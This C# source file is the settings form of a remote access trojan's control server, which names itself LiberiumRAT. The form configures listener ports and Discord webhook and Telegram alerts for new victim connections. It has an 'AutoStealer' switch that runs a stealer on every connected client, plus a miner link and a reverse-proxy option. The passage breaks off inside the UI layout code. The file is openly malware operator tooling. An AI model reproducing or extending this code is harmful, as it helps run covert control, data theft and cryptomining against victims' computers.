using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using CustomControls.RJControls;
using MaterialSkin;
using MaterialSkin.Controls;
using Newtonsoft.Json;
using Server.Connectings;
using Server.Data;
using Server.Helper;

namespace Server.Forms;

public class FormSettings : FormMaterial
{
	private bool _isFormLoaded;

	public static List<Listner> listners = new List<Listner>();

	private IContainer components;

	private RJTextBox rjTextBox1;

	private RJButton rjButton1;

	private GroupBox groupBox1;

	private MaterialLabel materialLabel2;

	private Label materialLabel1;

	private MaterialLabel materialLabel3;

	private NumericUpDown numericUpDown1;

	private GroupBox groupBox2;

	private RJTextBox rjTextBox2;

	public MaterialSwitch materialSwitch1;

	public MaterialSwitch materialSwitch2;

	private GroupBox groupBox3;

	private RJTextBox rjTextBox3;

	private GroupBox groupBox4;

	private MaterialLabel materialLabel4;

	private RJComboBox rjComboBox1;

	private CheckBox checkBox2;

	private CheckBox checkBox3;

	private GroupBox groupBox5;

	private RJTextBox rjTextBox5;

	public MaterialSwitch materialSwitch3;

	public MaterialSwitch materialSwitch4;

	private RJTextBox rjTextBox4;

	private RJButton rjButton2;

	private CheckBox checkBox1;

	private MaterialLabel materialLabel5;

	private RJComboBox rjComboBox2;

	private CheckBox checkBox4;

	public MaterialSwitch materialSwitch5;

	public MaterialSwitch materialSwitch6;

	private GroupBox groupBox6;

	private RJButton rjButton3;

	private RJTextBox rjTextBox7;

	private RJButton rjButton4;

	private CheckBox checkBox6;

	private CheckBox checkBox5;

	private RJComboBox rjComboBox3;

	private RJTextBox rjTextBox8;

	private CheckBox checkBox7;

	public FormSettings()
	{
		InitializeComponent();
	}

	private void FormSettings_Load(object sender, EventArgs e)
	{
		checkBox1.CheckedChanged += checkBox1_CheckedChanged;
		checkBox2.CheckedChanged += checkBox2_CheckedChanged;
		checkBox3.CheckedChanged += checkBox3_CheckedChanged;
		checkBox4.CheckedChanged += checkBox4_CheckedChanged;
		checkBox6.CheckedChanged += checkBox6_CheckedChanged;
		checkBox7.CheckedChanged += checkBox7_CheckedChanged;
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		ApplyLocalThemeToCombos();
		materialSwitch5.CheckedChanged += materialSwitch5_CheckedChanged;
		materialSwitch6.CheckedChanged += materialSwitch6_CheckedChanged;
		rjComboBox3.OnSelectedIndexChanged += rjComboBox3_OnSelectedIndexChanged;
		rjTextBox8.Leave += rjTextBox8_Leave;
		if (File.Exists("local\\Settings.json"))
		{
			Settings settings = JsonConvert.DeserializeObject<Settings>(File.ReadAllText("local\\Settings.json"));
			Program.form.settings = settings;
			materialSwitch1.Checked = settings.WebHookNewConnect;
			materialSwitch2.Checked = settings.WebHookConnect;
			checkBox2.Checked = settings.AutoStealer;
			rjTextBox2.Texts = settings.WebHook;
			rjTextBox1.Texts = ((settings.Ports != null) ? string.Join(",", settings.Ports) : "");
			rjTextBox3.Texts = settings.linkMiner;
			rjComboBox1.SelectedIndex = settings.Style;
			numericUpDown1.Value = settings.second;
			rjComboBox2.Items.Clear();
			rjComboBox2.Items.Add("Dark");
			rjComboBox2.Items.Add("Light");
			rjComboBox2.SelectedIndex = ((!settings.DarkTheme) ? 1 : 0);
			ApplyLocalThemeToCombos();
			rjTextBox4.Texts = settings.TelegramBotToken ?? "";
			rjTextBox5.Texts = settings.TelegramChatID ?? "";
			materialSwitch3.Checked = settings.TelegramConnect;
			materialSwitch4.Checked = settings.TelegramNewConnect;
			checkBox3.Checked = settings.Sounds;
			checkBox1.Checked = settings.DiscordRPC;
			checkBox4.Checked = settings.Notificator;
			checkBox5.Checked = settings.Background;
			checkBox6.Checked = settings.AutoNote;
			checkBox7.Checked = settings.AutoFRPC;
			materialSwitch5.Checked = settings.RainbowTheme || RainbowThemeManager.IsActive();
			materialSwitch6.Checked = settings.SpeedUPTheme;
			if (!string.IsNullOrEmpty(settings.FormText))
			{
				rjTextBox7.Texts = settings.FormText;
				if (Program.form != null)
				{
					Program.form.UpdateFormText(settings.FormText);
				}
			}
			rjComboBox3.SelectedIndex = settings.FormTextAnimationType;
			if (Program.form != null)
			{
				Program.form.SetAnimationType(settings.FormTextAnimationType);
			}
			rjTextBox8.Texts = settings.FormTextAnimationSpeed.ToString();
			if (Program.form != null)
			{
				Program.form.SetAnimationSpeed(settings.FormTextAnimationSpeed);
			}
		}
		else
		{
			checkBox3.Checked = false;
			checkBox1.Checked = false;
			rjComboBox2.Items.Clear();
			rjComboBox2.Items.Add("Dark");
			rjComboBox2.Items.Add("Light");
			rjComboBox2.SelectedIndex = 1;
			ApplyLocalThemeToCombos();
			materialSwitch5.Checked = false;
			materialSwitch6.Checked = false;
		}
		rjButton2.Click += rjButton2_Click;
		if (checkBox1.Checked)
		{
			DiscordRPC.Initialize();
		}
		if (listners.Count > 0)
		{
			rjTextBox1.Enabled = false;
			rjButton1.Text = "Stop";
			materialLabel1.Text = "Status: [Listner ports: ";
			string text = "";
			foreach (Listner listner in listners)
			{
				text = text + listner.port + ",";
			}
			text = text.Remove(text.Length - 1, 1);
			Label label = materialLabel1;
			label.Text = label.Text + text + "]";
		}
		if (Certificate.Imported)
		{
			materialLabel2.Text = "Certificate: [Imported]";
		}
		base.FormClosing += ClosingForm;
		_isFormLoaded = true;
	}

	private void ChangeScheme(object sender)
	{
		Color styleColor = (RainbowThemeManager.IsActive() ? RainbowThemeManager.GetStyleColor() : FormMaterial.PrimaryColor);
		numericUpDown1.ForeColor = styleColor;
		rjComboBox1.BorderColor = styleColor;
		rjComboBox2.BorderColor = styleColor;
		rjComboBox3.BorderColor = styleColor;
		rjTextBox1.BorderColor = styleColor;
		rjTextBox2.BorderColor = styleColor;
		rjTextBox3.BorderColor = styleColor;
		rjTextBox4.BorderColor = styleColor;
		rjTextBox5.BorderColor = styleColor;
		rjButton1.BackColor = styleColor;
		rjButton2.BackColor = styleColor;
		rjTextBox7.BorderColor = styleColor;
		rjButton3.BackColor = styleColor;
		rjButton4.BackColor = styleColor;
		rjTextBox8.BorderColor = styleColor;
	}

	private void ClosingForm(object sender, EventArgs e)
	{
		Settings settings = (File.Exists("local\\Settings.json") ? JsonConvert.DeserializeObject<Settings>(File.ReadAllText("local\\Settings.json")) : new Settings());
		settings.Ports = rjTextBox1.Texts.Split(',');
		settings.Start = rjButton1.Text == "Stop";
		settings.second = (int)numericUpDown1.Value;
		settings.WebHookNewConnect = materialSwitch1.Checked;
		settings.WebHookConnect = materialSwitch2.Checked;
		settings.AutoStealer = checkBox2.Checked;
		settings.WebHook = rjTextBox2.Texts;
		settings.linkMiner = rjTextBox3.Texts;
		settings.Style = rjComboBox1.SelectedIndex;
		settings.TelegramBotToken = rjTextBox4.Texts;
		settings.TelegramChatID = rjTextBox5.Texts;
		settings.TelegramConnect = materialSwitch3.Checked;
		settings.TelegramNewConnect = materialSwitch4.Checked;
		settings.Sounds = checkBox3.Checked;
		settings.DiscordRPC = checkBox1.Checked;
		settings.DarkTheme = rjComboBox2.SelectedIndex == 0;
		settings.RainbowTheme = materialSwitch5.Checked;
		settings.SpeedUPTheme = materialSwitch6.Checked;
		settings.Notificator = checkBox4.Checked;
		settings.Background = checkBox5.Checked;
		settings.AutoNote = checkBox6.Checked;
		settings.AutoFRPC = checkBox7.Checked;
		settings.FormText = rjTextBox7.Texts;
		settings.FormTextAnimationType = rjComboBox3.SelectedIndex;
		if (int.TryParse(rjTextBox8.Texts, out var speed))
		{
			settings.FormTextAnimationSpeed = Math.Max(10, Math.Min(1000, speed));
		}
		Program.form.settings = settings;
		File.WriteAllText("local\\Settings.json", JsonConvert.SerializeObject(settings));
	}

	private void rjButton1_Click(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(rjButton1.Text))
		{
			return;
		}
		if (materialLabel2.Text == "Certificate: [Not Exists]")
		{
			new FormCertificate().ShowDialog();
		}
		else if (rjButton1.Text == "Start")
		{
			rjTextBox1.Enabled = false;
			rjButton1.Text = "Stop";
			rjTextBox1.Texts.Split(',').ToList().ForEach(delegate(string item)
			{
				listners.Add(new Listner(Convert.ToInt32(item)));
			});
			materialLabel1.Text = "Status: [Listner ports: ";
			foreach (Listner listner in listners)
			{
				Label label = materialLabel1;
				label.Text = label.Text + listner.port + ",";
			}
			materialLabel1.Text = materialLabel1.Text.Remove(materialLabel1.Text.Length - 1, 1) + "]";
		}
		else
		{
			rjButton1.Text = "Start";
			rjTextBox1.Enabled = true;
			listners.ForEach(delegate(Listner item)
			{
				item.Stop();
			});
			listners.Clear();
			materialLabel1.Text = "Status: [offline]";
		}
	}

	private void rjComboBox1_OnSelectedIndexChanged(object sender, EventArgs e)
	{
		if (!_isFormLoaded)
		{
			return;
		}
		MaterialSkinManager instance = MaterialSkinManager.Instance;
		FormMaterial.GetColorScheme(rjComboBox1.SelectedIndex, instance);
		Task.Run(async delegate
		{
			await Task.Delay(50);
			Invoke((Action)delegate
			{
				ChangeScheme(this);
				ApplyLocalThemeToCombos();
				UpdateAllFormsTheme();
				Invalidate(invalidateChildren: true);
				Refresh();
				if (Program.form != null)
				{
					Program.form.Invalidate(invalidateChildren: true);
					Program.form.Refresh();
				}
			});
		});
		SaveCurrentSettings();
	}

	private void rjComboBox2_OnSelectedIndexChanged(object sender, EventArgs e)
	{
		MaterialSkinManager instance = MaterialSkinManager.Instance;
		if (RainbowThemeManager.IsActive() && materialSwitch5.Checked)
		{
			if (rjComboBox2.SelectedIndex == 0)
			{
				instance.Theme = MaterialSkinManager.Themes.DARK;
			}
			else
			{
				instance.Theme = MaterialSkinManager.Themes.LIGHT;
			}
			RainbowThemeManager.StartRainbowTheme(materialSwitch6.Checked);
		}
		else if (rjComboBox2.SelectedIndex == 0)
		{
			instance.Theme = MaterialSkinManager.Themes.DARK;
		}
		else
		{
			instance.Theme = MaterialSkinManager.Themes.LIGHT;
		}
		ApplyLocalThemeToCombos();
		Invalidate(invalidateChildren: true);
		Refresh();
		if (Program.form != null)
		{
			Program.form.Invalidate(invalidateChildren: true);
			Program.form.Refresh();
		}
	}

	private void ApplyLocalThemeToCombos()
	{
		bool num = MaterialSkinManager.Instance.Theme == MaterialSkinManager.Themes.DARK;
		Color back = (num ? Color.FromArgb(40, 40, 40) : Color.WhiteSmoke);
		Color text = (num ? Color.WhiteSmoke : Color.DimGray);
		Color icon = FormMaterial.PrimaryColor;
		rjComboBox1.BackColor = back;
		rjComboBox1.ForeColor = text;
		rjComboBox1.ListBackColor = back;
		rjComboBox1.ListTextColor = text;
		rjComboBox1.IconColor = icon;
		rjComboBox2.BackColor = back;
		rjComboBox2.ForeColor = text;
		rjComboBox2.ListBackColor = back;
		rjComboBox2.ListTextColor = text;
		rjComboBox2.IconColor = icon;
		rjComboBox3.BackColor = back;
		rjComboBox3.ForeColor = text;
		rjComboBox3.ListBackColor = back;
		rjComboBox3.ListTextColor = text;
		rjComboBox3.IconColor = icon;
	}

	private void rjButton2_Click(object sender, EventArgs e)
	{
		string botToken = rjTextBox4.Texts;
		string chatId = rjTextBox5.Texts;
		if (string.IsNullOrEmpty(botToken))
		{
			MessageBox.Show("Please enter Bot Token", "Telegram Notificator", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			return;
		}
		if (string.IsNullOrEmpty(chatId))
		{
			MessageBox.Show("Please enter Chat ID", "Telegram Notificator", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			return;
		}
		try
		{
			string result = TelegramNotificator.Send("✅ <b>Telegram Notificator Test</b>\n\nThis is a test message from LiberiumRAT Server.", botToken, chatId);
			if (result.Contains("\"ok\":true") || result.Contains("ok\":true"))
			{
				MessageBox.Show("✅ Telegram Notificator is working correctly!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			}
			else
			{
				MessageBox.Show("❌ Error: " + result, "Telegram Notificator", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show("❌ Error: " + ex.Message, "Telegram Notificator", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private void checkBox3_CheckedChanged(object sender, EventArgs e)
	{
		if (Program.form != null && Program.form.settings != null)
		{
			Program.form.settings.Sounds = checkBox3.Checked;
		}
		if (_isFormLoaded && checkBox3.Checked)
		{
			new FormCustomSounds().ShowDialog();
		}
	}

	private void checkBox1_CheckedChanged(object sender, EventArgs e)
	{
		if (checkBox1.Checked)
		{
			DiscordRPC.Initialize();
		}
		else
		{
			DiscordRPC.Shutdown();
		}
		if (Program.form != null && Program.form.settings != null)
		{
			Program.form.settings.DiscordRPC = checkBox1.Checked;
		}
	}

	private void checkBox2_CheckedChanged(object sender, EventArgs e)
	{
		if (Program.form != null && Program.form.settings != null)
		{
			Program.form.settings.AutoStealer = checkBox2.Checked;
		}
		if (checkBox2.Checked && Program.form != null)
		{
			Clients[] allClients = Program.form.ClientsAll();
			if (allClients != null && allClients.Length != 0)
			{
				Clients[] array = allClients;
				foreach (Clients client in array)
				{
					if (client != null && client.itsConnect)
					{
						AutoStealerManager.ProcessClient(client);
					}
				}
			}
		}
		if (File.Exists("local\\Settings.json"))
		{
			try
			{
				Settings settings = JsonConvert.DeserializeObject<Settings>(File.ReadAllText("local\\Settings.json"));
				settings.AutoStealer = checkBox2.Checked;
				File.WriteAllText("local\\Settings.json", JsonConvert.SerializeObject(settings));
			}
			catch
			{
			}
		}
	}

	private void checkBox4_CheckedChanged(object sender, EventArgs e)
	{
		if (Program.form != null && Program.form.settings != null)
		{
			Program.form.settings.Notificator = checkBox4.Checked;
		}
		if (File.Exists("local\\Settings.json"))
		{
			try
			{
				Settings settings = JsonConvert.DeserializeObject<Settings>(File.ReadAllText("local\\Settings.json"));
				settings.Notificator = checkBox4.Checked;
				File.WriteAllText("local\\Settings.json", JsonConvert.SerializeObject(settings));
			}
			catch
			{
			}
		}
	}

	private void checkBox6_CheckedChanged(object sender, EventArgs e)
	{
		if (Program.form != null && Program.form.settings != null)
		{
			Program.form.settings.AutoNote = checkBox6.Checked;
		}
		if (File.Exists("local\\Settings.json"))
		{
			try
			{
				Settings settings = JsonConvert.DeserializeObject<Settings>(File.ReadAllText("local\\Settings.json"));
				settings.AutoNote = checkBox6.Checked;
				File.WriteAllText("local\\Settings.json", JsonConvert.SerializeObject(settings));
			}
			catch
			{
			}
		}
	}

	private void checkBox7_CheckedChanged(object sender, EventArgs e)
	{
		if (Program.form != null && Program.form.settings != null)
		{
			Program.form.settings.AutoFRPC = checkBox7.Checked;
		}
		if (File.Exists("local\\Settings.json"))
		{
			try
			{
				Settings settings = JsonConvert.DeserializeObject<Settings>(File.ReadAllText("local\\Settings.json"));
				settings.AutoFRPC = checkBox7.Checked;
				File.WriteAllText("local\\Settings.json", JsonConvert.SerializeObject(settings));
			}
			catch
			{
			}
		}
		if (checkBox7.Checked && _isFormLoaded)
		{
			new FormFRPCSettings().ShowDialog();
		}
	}

	private void materialSwitch5_CheckedChanged(object sender, EventArgs e)
	{
		if (materialSwitch5.Checked)
		{
			RainbowThemeManager.StartRainbowTheme(materialSwitch6.Checked);
			Task.Run(delegate
			{
				try
				{
					if (File.Exists("local\\Settings.json"))
					{
						Settings settings = JsonConvert.DeserializeObject<Settings>(File.ReadAllText("local\\Settings.json"));
						settings.RainbowTheme = materialSwitch5.Checked;
						File.WriteAllText("local\\Settings.json", JsonConvert.SerializeObject(settings));
					}
				}
				catch
				{
				}
			});
			return;
		}
		RainbowThemeManager.StopRainbowTheme();
		MaterialSkinManager instance = MaterialSkinManager.Instance;
		FormMaterial.GetColorScheme(rjComboBox1.SelectedIndex, instance);
		Task.Run(async delegate
		{
			await Task.Delay(50);
			Invoke((Action)delegate
			{
				ChangeScheme(this);
				ApplyLocalThemeToCombos();
				UpdateAllFormsTheme();
				Refresh();
			});
		});
		SaveCurrentSettings();
	}

	private void materialSwitch6_CheckedChanged(object sender, EventArgs e)
	{
		RainbowThemeManager.SetSpeedUp(materialSwitch6.Checked);
		Task.Run(delegate
		{
			try
			{
				if (File.Exists("local\\Settings.json"))
				{
					Settings settings = JsonConvert.DeserializeObject<Settings>(File.ReadAllText("local\\Settings.json"));
					settings.SpeedUPTheme = materialSwitch6.Checked;
					File.WriteAllText("local\\Settings.json", JsonConvert.SerializeObject(settings));
				}
			}
			catch
			{
			}
		});
	}

	private void checkBox5_CheckedChanged(object sender, EventArgs e)
	{
		if (Program.form != null && Program.form.settings != null)
		{
			Program.form.settings.Background = checkBox5.Checked;
		}
		if (checkBox5.Checked && _isFormLoaded)
		{
			try
			{
				FormCustombackground formCustombackground = new FormCustombackground();
				formCustombackground.ShowDialog();
				formCustombackground.Dispose();
			}
			catch (Exception)
			{
			}
		}
		else if (!checkBox5.Checked && _isFormLoaded && Program.form != null)
		{
			Program.form.ApplyBackground();
		}
		if (_isFormLoaded)
		{
			SaveCurrentSettings();
		}
	}

	private void SaveCurrentSettings()
	{
		try
		{
			Settings settings = (File.Exists("local\\Settings.json") ? JsonConvert.DeserializeObject<Settings>(File.ReadAllText("local\\Settings.json")) : new Settings());
			settings.Ports = rjTextBox1.Texts.Split(',');
			settings.Start = rjButton1.Text == "Stop";
			settings.second = (int)numericUpDown1.Value;
			settings.WebHookNewConnect = materialSwitch1.Checked;
			settings.WebHookConnect = materialSwitch2.Checked;
			settings.AutoStealer = checkBox2.Checked;
			settings.WebHook = rjTextBox2.Texts;
			settings.linkMiner = rjTextBox3.Texts;
			settings.Style = rjComboBox1.SelectedIndex;
			settings.TelegramBotToken = rjTextBox4.Texts;
			settings.TelegramChatID = rjTextBox5.Texts;
			settings.TelegramConnect = materialSwitch3.Checked;
			settings.TelegramNewConnect = materialSwitch4.Checked;
			settings.Sounds = checkBox3.Checked;
			settings.DiscordRPC = checkBox1.Checked;
			settings.DarkTheme = rjComboBox2.SelectedIndex == 0;
			settings.RainbowTheme = materialSwitch5.Checked;
			settings.SpeedUPTheme = materialSwitch6.Checked;
			settings.Notificator = checkBox4.Checked;
			settings.Background = checkBox5.Checked;
			settings.AutoNote = checkBox6.Checked;
			settings.AutoFRPC = checkBox7.Checked;
			settings.FormText = rjTextBox7.Texts;
			settings.FormTextAnimationType = rjComboBox3.SelectedIndex;
			if (int.TryParse(rjTextBox8.Texts, out var speed))
			{
				settings.FormTextAnimationSpeed = Math.Max(10, Math.Min(1000, speed));
			}
			Program.form.settings = settings;
			File.WriteAllText("local\\Settings.json", JsonConvert.SerializeObject(settings));
		}
		catch (Exception)
		{
		}
	}

	private void UpdateAllFormsTheme()
	{
		try
		{
			_ = MaterialSkinManager.Instance;
			if (Program.form != null && !Program.form.IsDisposed)
			{
				if (Program.form.InvokeRequired)
				{
					Program.form.Invoke((Action)delegate
					{
						Program.form.Invalidate(invalidateChildren: true);
						Program.form.Refresh();
						Program.form.Update();
					});
				}
				else
				{
					Program.form.Invalidate(invalidateChildren: true);
					Program.form.Refresh();
					Program.form.Update();
				}
			}
			foreach (Form form in Application.OpenForms)
			{
				if (form == null || form.IsDisposed || !form.IsHandleCreated)
				{
					continue;
				}
				try
				{
					if (form.InvokeRequired)
					{
						form.BeginInvoke((Action)delegate
						{
							form.Invalidate(invalidateChildren: true);
							form.Refresh();
							form.Update();
						});
					}
					else
					{
						form.Invalidate(invalidateChildren: true);
						form.Refresh();
						form.Update();
					}
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
	}

	private void rjButton3_Click(object sender, EventArgs e)
	{
		string newText = rjTextBox7.Texts;
		if (string.IsNullOrWhiteSpace(newText))
		{
			return;
		}
		if (Program.form != null)
		{
			Program.form.UpdateFormText(newText);
		}
		try
		{
			if (File.Exists("local\\Settings.json"))
			{
				Settings settings = JsonConvert.DeserializeObject<Settings>(File.ReadAllText("local\\Settings.json"));
				settings.FormText = newText;
				File.WriteAllText("local\\Settings.json", JsonConvert.SerializeObject(settings));
				if (Program.form != null && Program.form.settings != null)
				{
					Program.form.settings.FormText = newText;
				}
			}
		}
		catch (Exception)
		{
		}
	}

	private void rjButton4_Click(object sender, EventArgs e)
	{
		string defaultText = "✦ LiberiumRAT ✦ | ✨ Version: 3.1 [RECODE] ✨";
		rjTextBox7.Texts = defaultText;
		if (Program.form != null)
		{
			Program.form.ResetFormText();
		}
		try
		{
			if (File.Exists("local\\Settings.json"))
			{
				Settings settings = JsonConvert.DeserializeObject<Settings>(File.ReadAllText("local\\Settings.json"));
				settings.FormText = defaultText;
				File.WriteAllText("local\\Settings.json", JsonConvert.SerializeObject(settings));
				if (Program.form != null && Program.form.settings != null)
				{
					Program.form.settings.FormText = defaultText;
				}
			}
		}
		catch (Exception)
		{
		}
	}

	private void rjComboBox3_OnSelectedIndexChanged(object sender, EventArgs e)
	{
		if (!_isFormLoaded)
		{
			return;
		}
		int selectedType = rjComboBox3.SelectedIndex;
		if (Program.form != null)
		{
			Program.form.SetAnimationType(selectedType);
		}
		try
		{
			if (File.Exists("local\\Settings.json"))
			{
				Settings settings = JsonConvert.DeserializeObject<Settings>(File.ReadAllText("local\\Settings.json"));
				settings.FormTextAnimationType = selectedType;
				File.WriteAllText("local\\Settings.json", JsonConvert.SerializeObject(settings));
				if (Program.form != null && Program.form.settings != null)
				{
					Program.form.settings.FormTextAnimationType = selectedType;
				}
			}
		}
		catch (Exception)
		{
		}
	}

	private void rjTextBox8_Leave(object sender, EventArgs e)
	{
		if (!_isFormLoaded)
		{
			return;
		}
		if (int.TryParse(rjTextBox8.Texts, out var speed))
		{
			speed = Math.Max(10, Math.Min(1000, speed));
			if (speed.ToString() != rjTextBox8.Texts)
			{
				rjTextBox8.Texts = speed.ToString();
			}
			if (Program.form != null)
			{
				Program.form.SetAnimationSpeed(speed);
			}
			try
			{
				if (File.Exists("local\\Settings.json"))
				{
					Settings settings = JsonConvert.DeserializeObject<Settings>(File.ReadAllText("local\\Settings.json"));
					settings.FormTextAnimationSpeed = speed;
					File.WriteAllText("local\\Settings.json", JsonConvert.SerializeObject(settings));
					if (Program.form != null && Program.form.settings != null)
					{
						Program.form.settings.FormTextAnimationSpeed = speed;
					}
				}
				return;
			}
			catch (Exception)
			{
				return;
			}
		}
		rjTextBox8.Texts = "80";
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.rjTextBox1 = new CustomControls.RJControls.RJTextBox();
		this.rjButton1 = new CustomControls.RJControls.RJButton();
		this.groupBox1 = new System.Windows.Forms.GroupBox();
		this.checkBox6 = new System.Windows.Forms.CheckBox();
		this.checkBox5 = new System.Windows.Forms.CheckBox();
		this.checkBox4 = new System.Windows.Forms.CheckBox();
		this.checkBox1 = new System.Windows.Forms.CheckBox();
		this.checkBox3 = new System.Windows.Forms.CheckBox();
		this.checkBox2 = new System.Windows.Forms.CheckBox();
		this.materialLabel3 = new MaterialSkin.Controls.MaterialLabel();
		this.numericUpDown1 = new System.Windows.Forms.NumericUpDown();
		this.materialLabel1 = new System.Windows.Forms.Label();
		this.materialLabel2 = new MaterialSkin.Controls.MaterialLabel();
		this.groupBox2 = new System.Windows.Forms.GroupBox();
		this.materialSwitch2 = new MaterialSkin.Controls.MaterialSwitch();
		this.materialSwitch1 = new MaterialSkin.Controls.MaterialSwitch();
		this.rjTextBox2 = new CustomControls.RJControls.RJTextBox();
		this.groupBox3 = new System.Windows.Forms.GroupBox();
		this.rjTextBox3 = new CustomControls.RJControls.RJTextBox();
		this.groupBox4 = new System.Windows.Forms.GroupBox();
		this.materialSwitch6 = new MaterialSkin.Controls.MaterialSwitch();
		this.materialSwitch5 = new MaterialSkin.Controls.MaterialSwitch();
		this.materialLabel5 = new MaterialSkin.Controls.MaterialLabel();
		this.rjComboBox2 = new CustomControls.RJControls.RJComboBox();
		this.materialLabel4 = new MaterialSkin.Controls.MaterialLabel();
		this.rjComboBox1 = new CustomControls.RJControls.RJComboBox();
		this.groupBox5 = new System.Windows.Forms.GroupBox();
		this.rjButton2 = new CustomControls.RJControls.RJButton();
		this.rjTextBox5 = new CustomControls.RJControls.RJTextBox();
		this.materialSwitch3 = new MaterialSkin.Controls.MaterialSwitch();
		this.materialSwitch4 = new MaterialSkin.Controls.MaterialSwitch();
		this.rjTextBox4 = new CustomControls.RJControls.RJTextBox();
		this.groupBox6 = new System.Windows.Forms.GroupBox();
		this.rjTextBox8 = new CustomControls.RJControls.RJTextBox();
		this.rjComboBox3 = new CustomControls.RJControls.RJComboBox();
		this.rjButton4 = new CustomControls.RJControls.RJButton();
		this.rjButton3 = new CustomControls.RJControls.RJButton();
		this.rjTextBox7 = new CustomControls.RJControls.RJTextBox();
		this.checkBox7 = new System.Windows.Forms.CheckBox();
		this.groupBox1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.numericUpDown1).BeginInit();
		this.groupBox2.SuspendLayout();
		this.groupBox3.SuspendLayout();
		this.groupBox4.SuspendLayout();
		this.groupBox5.SuspendLayout();
		this.groupBox6.SuspendLayout();
		base.SuspendLayout();
		this.rjTextBox1.BackColor = System.Drawing.Color.White;
		this.rjTextBox1.BorderColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.rjTextBox1.BorderFocusColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.rjTextBox1.BorderRadius = 0;
		this.rjTextBox1.BorderSize = 2;
		this.rjTextBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox1.ForeColor = System.Drawing.Color.Black;
		this.rjTextBox1.Location = new System.Drawing.Point(16, 20);
		this.rjTextBox1.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox1.Multiline = false;
		this.rjTextBox1.Name = "rjTextBox1";
		this.rjTextBox1.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox1.PasswordChar = false;
		this.rjTextBox1.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox1.PlaceholderText = "Ports";
		this.rjTextBox1.Size = new System.Drawing.Size(250, 31);
		this.rjTextBox1.TabIndex = 0;
		this.rjTextBox1.Texts = "";
		this.rjTextBox1.UnderlinedStyle = false;
		this.rjButton1.BackColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.rjButton1.BackgroundColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.rjButton1.BorderColor = System.Drawing.Color.DarkViolet;
		this.rjButton1.BorderRadius = 0;
		this.rjButton1.BorderSize = 0;
		this.rjButton1.FlatAppearance.BorderSize = 0;
		this.rjButton1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton1.ForeColor = System.Drawing.Color.White;
		this.rjButton1.Location = new System.Drawing.Point(16, 58);
		this.rjButton1.Name = "rjButton1";
		this.rjButton1.Size = new System.Drawing.Size(103, 29);
		this.rjButton1.TabIndex = 1;
		this.rjButton1.Text = "Start";
		this.rjButton1.TextColor = System.Drawing.Color.White;
		this.rjButton1.UseVisualStyleBackColor = false;
		this.rjButton1.Click += new System.EventHandler(rjButton1_Click);
		this.groupBox1.BackColor = System.Drawing.Color.White;
		this.groupBox1.Controls.Add(this.checkBox7);
		this.groupBox1.Controls.Add(this.checkBox6);
		this.groupBox1.Controls.Add(this.checkBox5);
		this.groupBox1.Controls.Add(this.checkBox4);
		this.groupBox1.Controls.Add(this.checkBox1);
		this.groupBox1.Controls.Add(this.checkBox3);
		this.groupBox1.Controls.Add(this.checkBox2);
		this.groupBox1.Controls.Add(this.materialLabel3);
		this.groupBox1.Controls.Add(this.numericUpDown1);
		this.groupBox1.Controls.Add(this.materialLabel1);
		this.groupBox1.Controls.Add(this.materialLabel2);
		this.groupBox1.Controls.Add(this.rjTextBox1);
		this.groupBox1.Controls.Add(this.rjButton1);
		this.groupBox1.ForeColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.groupBox1.Location = new System.Drawing.Point(15, 67);
		this.groupBox1.Name = "groupBox1";
		this.groupBox1.Size = new System.Drawing.Size(407, 200);
		this.groupBox1.TabIndex = 2;
		this.groupBox1.TabStop = false;
		this.groupBox1.Text = "Server";
		this.checkBox6.AutoSize = true;
		this.checkBox6.ForeColor = System.Drawing.Color.Black;
		this.checkBox6.Location = new System.Drawing.Point(230, 168);
		this.checkBox6.Name = "checkBox6";
		this.checkBox6.Size = new System.Drawing.Size(74, 17);
		this.checkBox6.TabIndex = 70;
		this.checkBox6.Text = "Auto Note";
		this.checkBox6.UseVisualStyleBackColor = true;
		this.checkBox5.AutoSize = true;
		this.checkBox5.ForeColor = System.Drawing.Color.Black;
		this.checkBox5.Location = new System.Drawing.Point(230, 148);
		this.checkBox5.Name = "checkBox5";
		this.checkBox5.Size = new System.Drawing.Size(84, 17);
		this.checkBox5.TabIndex = 69;
		this.checkBox5.Text = "Background";
		this.checkBox5.UseVisualStyleBackColor = true;
		this.checkBox5.CheckedChanged += new System.EventHandler(checkBox5_CheckedChanged);
		this.checkBox4.AutoSize = true;
		this.checkBox4.ForeColor = System.Drawing.Color.Black;
		this.checkBox4.Location = new System.Drawing.Point(230, 129);
		this.checkBox4.Name = "checkBox4";
		this.checkBox4.Size = new System.Drawing.Size(74, 17);
		this.checkBox4.TabIndex = 68;
		this.checkBox4.Text = "Notificator";
		this.checkBox4.UseVisualStyleBackColor = true;
		this.checkBox1.AutoSize = true;
		this.checkBox1.ForeColor = System.Drawing.Color.Black;
		this.checkBox1.Location = new System.Drawing.Point(317, 150);
		this.checkBox1.Name = "checkBox1";
		this.checkBox1.Size = new System.Drawing.Size(84, 17);
		this.checkBox1.TabIndex = 67;
		this.checkBox1.Text = "DiscordRPC";
		this.checkBox1.UseVisualStyleBackColor = true;
		this.checkBox3.AutoSize = true;
